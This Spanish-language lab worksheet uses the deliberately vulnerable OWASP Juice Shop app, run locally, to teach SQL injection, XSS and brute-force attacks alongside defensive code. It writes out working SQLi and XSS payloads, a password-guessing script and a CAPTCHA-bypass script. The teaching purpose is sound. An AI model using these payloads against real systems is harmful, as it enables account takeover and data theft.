# Práctica Integradora: Ciberseguridad con OWASP Juice Shop

**Objetivo:** Aplicar los conceptos de seguridad vistos en clase utilizando OWASP Juice Shop, una aplicación web vulnerable construida con Node.js y Angular (TypeScript). Vas a identificar vulnerabilidades, explotarlas en un entorno controlado y luego escribir el código defensivo.

**Stack de Juice Shop:** Node.js + Express (backend), Angular + TypeScript (frontend), SQLite (base de datos), Sequelize (ORM).

> **Reglas de la práctica**
> - Solo trabajar contra tu instancia local de Juice Shop. Nunca contra servicios de terceros.
> - El objetivo es **aprender a defender**, no a atacar. Cada explotación es para entender qué hay que proteger.
> - Documentá todo lo que hagas: capturas, comandos, código.

## 1. Instalación y puesta en marcha

Vamos a correr Juice Shop desde el código fuente con hot reload: editás un archivo en tu máquina y el servidor se reinicia automáticamente.

### Requisitos previos

- Docker y Docker Compose instalados
- Git

### Paso 1: Clonar el repositorio

```bash
git clone --depth 1 https://github.com/juice-shop/juice-shop.git
cd juice-shop
```

### Paso 2: Agregar los archivos de desarrollo

Dentro de la carpeta `juice-shop/`, crear estos dos archivos:

**`Dockerfile.dev`:**

```dockerfile
FROM node:24-slim

RUN apt-get update && apt-get install -y python3 make g++ && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY . .

RUN npm install
RUN npm install -g nodemon tsx

EXPOSE 3000

CMD ["nodemon", "--legacy-watch", "--delay", "2", "--ext", "ts,js,json", "--watch", "routes", "--watch", "lib", "--watch", "models", "--watch", "data", "--watch", "config", "--watch", "app.ts", "--watch", "server.ts", "--exec", "tsx app.ts"]
```

**`docker-compose.yml`:**

```yaml
services:
  juice-shop:
    build:
      context: .
      dockerfile: Dockerfile.dev
    ports:
      - "3000:3000"
    volumes:
      - ./routes:/app/routes
      - ./lib:/app/lib
      - ./models:/app/models
      - ./data:/app/data
      - ./config:/app/config
      - ./app.ts:/app/app.ts
      - ./server.ts:/app/server.ts
      - node_modules:/app/node_modules
      - frontend_modules:/app/frontend/node_modules
    environment:
      - NODE_ENV=development
    restart: unless-stopped

volumes:
  node_modules:
  frontend_modules:
```

### Paso 3: Levantar el servidor

```bash
docker compose up -d --build
```

La primera vez tarda unos minutos (instala dependencias). Después abrí `http://localhost:3000`.

### Paso 4: Verificar hot reload

Probá editar cualquier archivo en `routes/` (por ejemplo, agregá un `console.log`). En los logs vas a ver que el servidor se reinicia solo:

```bash
docker compose logs -f
```

### Acceder al Scoreboard

Juice Shop tiene un tablero de desafíos oculto. Navegá a:

```
http://localhost:3000/#/score-board
```

Ahí vas a ver todos los desafíos organizados por categoría y dificultad (1 a 6 estrellas).

### Estructura del código que vas a editar

```
juice-shop/
├── routes/        ← Rutas Express (acá están las vulnerabilidades)
├── lib/           ← Utilidades del backend
├── models/        ← Modelos Sequelize (base de datos)
├── data/          ← Datos semilla
├── config/        ← Configuración
├── app.ts         ← Entry point de la app
└── frontend/      ← App Angular (no necesitás tocar esto)
```

Los ejercicios de esta práctica se centran en `routes/` — ahí están las rutas vulnerables que vas a analizar y corregir.

### Comandos útiles

```bash
docker compose logs -f       # ver logs en tiempo real
docker compose restart       # reiniciar el servidor
docker compose down          # apagar todo
docker compose up -d --build # reconstruir desde cero
```

### Reiniciar el progreso

Si necesitás volver al estado original (borrar tu progreso en los desafíos):

```bash
docker compose down
docker compose up -d --build
```

## 2. Inyección SQL (SQLi)

### Repaso del concepto

Una inyección SQL ocurre cuando datos del usuario se insertan directamente en una consulta SQL sin sanitización. El atacante puede modificar la lógica de la consulta para acceder, modificar o eliminar datos.

**Ejemplo vulnerable (Node.js + Sequelize raw query):**

```javascript
// MAL — concatenación directa
app.get("/api/users", (req, res) => {
  const query = `SELECT * FROM Users WHERE email = '${req.query.email}'`;
  sequelize.query(query).then(users => res.json(users));
});
```

**Si el usuario envía:** `' OR 1=1--`
**La consulta se convierte en:** `SELECT * FROM Users WHERE email = '' OR 1=1--'`
Devuelve todos los usuarios.

### Problema 1: Login como administrador

**Dificultad: 1 estrella**

**Desafío Juice Shop:** "Login Admin"
**Ubicación:** Página de login (`/#/login`)

**Contexto:** La pantalla de login de Juice Shop envía el email y password al endpoint `POST /rest/user/login`. Internamente, el backend construye una consulta SQL para buscar al usuario. Si la consulta no usa parámetros preparados, podemos inyectar lógica en el campo de email.

#### Resolución paso a paso

1. Andá a `http://localhost:3000/#/login`
2. En el campo email escribí: `' OR 1=1--`
3. En el campo password escribí cualquier cosa (por ejemplo: `x`)
4. Hacé clic en "Log in"

**¿Qué pasó?** La consulta interna se transformó en algo como:

```sql
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...'
```

El `--` comenta el resto de la consulta. `OR 1=1` siempre es verdadero, entonces devuelve el primer usuario de la tabla, que es el admin.

### Problema 2: Login como otro usuario específico

**Dificultad: 2 estrellas**

**Desafío Juice Shop:** "Login Bender" / "Login Jim"
**Objetivo:** Ingresar como el usuario `bender@juice-sh.op` sin conocer su contraseña.

#### Resolución

En el campo email:

```
bender@juice-sh.op'--
```

Esto cierra la cadena del email y comenta la verificación de password. La consulta queda:

```sql
SELECT * FROM Users WHERE email = 'bender@juice-sh.op'--' AND password = '...'
```

### Problema 3: Obtener el esquema de la base de datos

**Dificultad: 3 estrellas**

**Desafío Juice Shop:** "Database Schema"
**Ubicación:** El campo de búsqueda de productos (`/#/search`) también es vulnerable a SQLi.

**Contexto:** La búsqueda envía el término a `GET /rest/products/search?q=`. Internamente usa una query raw de SQLite.

#### Resolución

En la barra de búsqueda, escribí:

```
')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
```

**Explicación:**

- `'))` cierra los paréntesis de la consulta original
- `UNION SELECT` agrega una segunda consulta
- `sqlite_master` es la tabla interna de SQLite que contiene la definición de todas las tablas
- Los números `2,3,4,...,9` son placeholders para que el UNION tenga la misma cantidad de columnas que la consulta original

Los resultados aparecen como "productos" con las definiciones SQL de cada tabla.

### Código defensivo: consultas parametrizadas

La defensa es **nunca concatenar** datos del usuario en una query. Usar siempre parámetros:

```typescript
// BIEN — Sequelize con parámetros (Node.js/TypeScript)
import { QueryTypes } from "sequelize";

app.get("/api/users", async (req, res) => {
  const users = await sequelize.query(
    "SELECT * FROM Users WHERE email = :email",
    {
      replacements: { email: req.query.email },
      type: QueryTypes.SELECT,
    }
  );
  res.json(users);
});
```

```typescript
// MEJOR — usar el ORM directamente, sin queries raw
import { User } from "./models/user";

app.get("/api/users", async (req, res) => {
  const users = await User.findAll({
    where: { email: req.query.email },
  });
  res.json(users);
});
```

### Ejercicios para resolver

1. **Desafío "Christmas Special"** (3 estrellas): Hay un producto navideño oculto que no aparece en la búsqueda normal. Usá SQLi en el endpoint de búsqueda para encontrarlo y agregarlo al carrito. *Pista: probá inyectar en la búsqueda para ver productos donde `deletedAt` no es NULL.*
2. **Código defensivo:** Escribí un endpoint `GET /api/products/search?q=` en Express + Sequelize que busque productos por nombre de forma segura. Debe:
   - Usar consultas parametrizadas (no concatenación)
   - Limitar los resultados a 50
   - Solo devolver productos no eliminados
3. **Análisis:** Ingresá al código fuente de Juice Shop (`routes/search.ts`) y encontrá la línea exacta donde ocurre la vulnerabilidad. Explicá por qué es vulnerable y cómo la corregirías.



## 3. Cross-Site Scripting (XSS)

### Repaso del concepto

XSS ocurre cuando una aplicación incluye datos no sanitizados del usuario en la página HTML. El atacante puede inyectar JavaScript que se ejecuta en el navegador de otros usuarios, robando cookies, sesiones o datos.

**Tipos de XSS:**

| Tipo | Dónde se ejecuta | Ejemplo |
|------|-------------------|---------|
| **DOM XSS** | El script del cliente inserta datos en el DOM sin sanitizar | Leer de `location.hash` y ponerlo en `innerHTML` |
| **Reflected XSS** | El servidor refleja el input en la respuesta HTTP | Parámetro de búsqueda que aparece en la página de resultados |
| **Stored XSS** | El payload se guarda en la base de datos y se muestra a todos | Un comentario con `<script>` que se muestra a otros usuarios |

### Problema 1: DOM XSS en la búsqueda

**Dificultad: 1 estrella**

**Desafío Juice Shop:** "DOM XSS"
**Ubicación:** Barra de búsqueda

**Contexto:** La aplicación Angular de Juice Shop toma el término de búsqueda y lo renderiza en la página de resultados. Si el input se inserta usando `innerHTML` en lugar de interpolación segura de Angular, se puede inyectar HTML/JS.

#### Resolución

En la barra de búsqueda, escribí:

```html
<iframe src="javascript:alert('xss')">
```

**¿Por qué funciona?** Angular por defecto sanitiza el binding de datos, pero si el componente usa `[innerHTML]` para mostrar el término de búsqueda, el iframe se inyecta en el DOM y ejecuta el JavaScript.

**¿Por qué `<script>` no funciona?** Los navegadores modernos no ejecutan tags `<script>` insertados via `innerHTML`. Por eso se usa `<iframe>` con `src="javascript:..."`.

### Problema 2: Reflected XSS vía el tracking de pedidos

**Dificultad: 2 estrellas**

**Desafío Juice Shop:** "Reflected XSS"
**Ubicación:** Página de tracking de pedidos (`/#/track-result?id=`)

**Contexto:** Al rastrear un pedido, el ID del pedido se refleja en la página de resultados.

#### Resolución

Primero, hacé un pedido cualquiera para tener un ID válido. Luego modificá la URL:

```
http://localhost:3000/#/track-result?id=<iframe src="javascript:alert('xss')">
```

El ID se refleja sin sanitizar en la respuesta, ejecutando el código inyectado.

### Problema 3: XSS persistente vía la API

**Dificultad: 4 estrellas**

**Desafío Juice Shop:** "API-only XSS"

**Contexto:** Algunos campos que se escriben por API y se muestran en la UI no se sanitizan correctamente. El endpoint de productos permite inyectar HTML en la descripción.

#### Resolución

Usá `curl` o el DevTools del navegador para enviar un POST/PUT a la API con un payload XSS en un campo que se renderiza en la UI:

```javascript
// Desde la consola del navegador (estando logueado):
fetch("/api/Products/1", {
  method: "PUT",
  headers: {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + localStorage.getItem("token")
  },
  body: JSON.stringify({
    description: "<iframe src='javascript:alert(\"xss\")'>"
  })
});
```

Si el producto se muestra con `innerHTML`, el XSS se ejecuta cada vez que alguien ve ese producto.

### Código defensivo: sanitización y escape

```typescript
// En Angular — EVITAR innerHTML, usar interpolación
// MAL:
// <div [innerHTML]="searchTerm"></div>

// BIEN — Angular escapa automáticamente con {{ }}:
// <div>{{ searchTerm }}</div>

// Si necesitás HTML dinámico, usar DomSanitizer con cuidado:
import { DomSanitizer, SafeHtml } from "@angular/platform-browser";

@Component({ /* ... */ })
export class SearchComponent {
  safeContent: SafeHtml;

  constructor(private sanitizer: DomSanitizer) {}

  setContent(untrusted: string) {
    // sanitize() elimina scripts, iframes, event handlers
    this.safeContent = this.sanitizer.sanitize(
      SecurityContext.HTML, untrusted
    ) ?? "";
  }
}
```

```typescript
// En Express (backend) — escapar antes de guardar o servir
import escapeHtml from "escape-html";

app.post("/api/products", (req, res) => {
  const product = {
    name: escapeHtml(req.body.name),
    description: escapeHtml(req.body.description),
    price: Number(req.body.price),
  };
  // guardar en DB...
});
```

```typescript
// Content-Security-Policy en Express — limitar qué scripts se ejecutan
import helmet from "helmet";

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],       // solo scripts propios
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:"],
      frameSrc: ["'none'"],        // bloquea iframes
    },
  })
);
```

### Ejercicios para resolver

1. **Desafío "Client-side XSS Protection"** (3 estrellas): La aplicación tiene alguna protección contra XSS en el cliente, pero se puede evadir. Intentá registrar un usuario con un email que contenga un payload XSS (por ejemplo, con `<script>` en el email). *Pista: si el formulario de registro bloquea caracteres especiales, podés enviar el request directamente con fetch() o curl.*
2. **Código defensivo:** Escribí un middleware de Express que:
   - Agregue el header `Content-Security-Policy` bloqueando scripts inline y frames
   - Agregue `X-Content-Type-Options: nosniff`
   - Agregue `X-Frame-Options: DENY`
3. **Análisis:** Abrí el DevTools en Juice Shop, buscá en el código del frontend Angular dónde se usa `[innerHTML]` y explicá por qué es peligroso. ¿Qué alternativa usarías?



## 4. Fuerza Bruta y Autenticación

### Repaso del concepto

Un ataque de fuerza bruta intenta todas las combinaciones posibles de credenciales hasta encontrar la correcta. Las variantes más comunes son:

| Tipo | Descripción |
|------|-------------|
| **Fuerza bruta pura** | Probar todas las combinaciones (lento, poco práctico) |
| **Ataque de diccionario** | Usar listas de contraseñas comunes (rockyou.txt, etc.) |
| **Credential stuffing** | Usar combinaciones email/password filtradas de otros sitios |

La defensa no es solo tener contraseñas fuertes — es hacer que el proceso de adivinación sea **lento, detectable y limitado**.

### Problema 1: Contraseña débil del admin

**Dificultad: 2 estrellas**

**Desafío Juice Shop:** "Password Strength"
**Ubicación:** Login (`/#/login`)

**Contexto:** El administrador de Juice Shop usa una contraseña muy común. Si ya descubriste el email del admin con SQLi (`admin@juice-sh.op`), ahora se trata de encontrar su contraseña real.

#### Resolución

La idea es probar contraseñas comunes. Podés hacerlo manualmente o con un script sencillo:

```javascript
// brute-force-demo.mjs — Solo para uso educativo en tu instancia local
const TARGET = "http://localhost:3000";
const EMAIL  = "admin@juice-sh.op";

const passwords = [
  "password", "123456", "admin", "admin123", "password1",
  "letmein", "welcome", "monkey", "dragon", "master",
  "qwerty", "login", "abc123", "111111", "admin1",
];

for (const pw of passwords) {
  const res = await fetch(`${TARGET}/rest/user/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: EMAIL, password: pw }),
  });

  if (res.status === 200) {
    const data = await res.json();
    console.log(`Contraseña encontrada: ${pw}`);
    console.log(`Token: ${data.authentication.token}`);
    break;
  } else {
    console.log(`${pw} — fallido (${res.status})`);
  }
}
```

Ejecutalo con `node brute-force-demo.mjs`. La contraseña del admin es muy débil y está en cualquier lista de passwords comunes.

### Problema 2: Evadir el CAPTCHA

**Dificultad: 3 estrellas**

**Desafío Juice Shop:** "CAPTCHA Bypass"

**Contexto:** Juice Shop agrega un CAPTCHA al feedback del cliente. Pero la validación tiene una debilidad: el CAPTCHA se resuelve en el cliente y se envía junto con el formulario. Si inspeccionás la respuesta de la API, podés ver la respuesta esperada.

#### Resolución

1. Abrí DevTools > Network
2. Cargá la página de feedback (`/#/contact`)
3. Observá el request a `GET /rest/captcha/` — la respuesta incluye tanto la pregunta como el `captchaId`
4. La operación matemática del CAPTCHA se muestra en el frontend. Resolvela y enviá múltiples requests automatizados:

```javascript
// captcha-bypass-demo.mjs
const TARGET = "http://localhost:3000";

async function submitFeedback(comment) {
  // Obtener un captcha fresco
  const captchaRes = await fetch(`${TARGET}/rest/captcha/`);
  const captcha = await captchaRes.json();

  // Resolver la operación (viene como string, ej: "3*7-2")
  const answer = eval(captcha.captcha); // solo OK en demo local

  const res = await fetch(`${TARGET}/api/Feedbacks/`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      captchaId: captcha.captchaId,
      captcha: answer.toString(),
      comment: comment,
      rating: 1,
    }),
  });

  return res.status;
}

// Enviar 5 feedbacks automatizados
for (let i = 0; i < 5; i++) {
  const status = await submitFeedback(`Feedback automático #${i + 1}`);
  console.log(`Feedback ${i + 1}: ${status}`);
}
```

### Código defensivo: rate limiting, bcrypt y bloqueo

```typescript
// Rate limiting con express-rate-limit
import rateLimit from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5,                    // máximo 5 intentos por ventana
  message: {
    error: "Demasiados intentos. Intentá de nuevo en 15 minutos.",
  },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => req.body.email || req.ip,
});

app.post("/api/login", loginLimiter, async (req, res) => {
  // ... lógica de login
});
```

```typescript
// Hasheo de contraseñas con bcrypt
import bcrypt from "bcrypt";

const SALT_ROUNDS = 12;

// Al registrar un usuario:
async function registerUser(email: string, password: string) {
  const hash = await bcrypt.hash(password, SALT_ROUNDS);
  await User.create({ email, password: hash });
}

// Al hacer login:
async function verifyLogin(email: string, password: string) {
  const user = await User.findOne({ where: { email } });
  if (!user) return null;

  const match = await bcrypt.compare(password, user.password);
  return match ? user : null;
}
```

```typescript
// Bloqueo progresivo de cuenta
const failedAttempts = new Map<string, { count: number; lockedUntil: Date | null }>();

function checkAccountLock(email: string): boolean {
  const record = failedAttempts.get(email);
  if (!record) return false;
  if (record.lockedUntil && record.lockedUntil > new Date()) return true;
  return false;
}

function recordFailedAttempt(email: string) {
  const record = failedAttempts.get(email) ?? { count: 0, lockedUntil: null };
  record.count++;

  if (record.count >= 5) {
    // Bloquear 15 minutos, duplicar por cada bloqueo sucesivo
    const minutes = 15 * Math.pow(2, Math.floor(record.count / 5) - 1);
    record.lockedUntil = new Date(Date.now() + minutes * 60 * 1000);
  }

  failedAttempts.set(email, record);
}
```

```typescript
// Validación de complejidad de contraseña
function validatePassword(password: string): string[] {
  const errors: string[] = [];
  if (password.length < 10)
    errors.push("Mínimo 10 caracteres");
  if (!/[A-Z]/.test(password))
    errors.push("Al menos una mayúscula");
  if (!/[a-z]/.test(password))
    errors.push("Al menos una minúscula");
  if (!/[0-9]/.test(password))
    errors.push("Al menos un número");
  if (!/[^A-Za-z0-9]/.test(password))
    errors.push("Al menos un carácter especial");
  return errors;
}
```

### Ejercicios para resolver

1. **Desafío "Reset Morty's Password"** (3 estrellas): Buscá la pregunta de seguridad de Morty y usá información pública (su personaje) para resetear su contraseña. Esto demuestra por qué las preguntas de seguridad son una mala práctica. *Pista: ¿cuál es la mascota favorita del personaje Morty Smith?*
2. **Código defensivo:** Escribí un módulo completo de autenticación en Express + TypeScript que incluya:
   - Registro con validación de complejidad de contraseña
   - Login con rate limiting (máx. 5 intentos por email en 15 min)
   - Hasheo con bcrypt (mínimo 12 rounds)
   - Respuestas genéricas ("Credenciales inválidas" sin especificar si el email o el password está mal)
3. **Análisis:** El admin de Juice Shop usa una contraseña muy débil. Escribí un párrafo explicando:
   - ¿Por qué la longitud mínima importa más que la complejidad?
   - ¿Qué diferencia hace bcrypt vs MD5/SHA para un ataque de fuerza bruta?
   - ¿Cómo el rate limiting hace que el script del Problema 1 deje de funcionar?



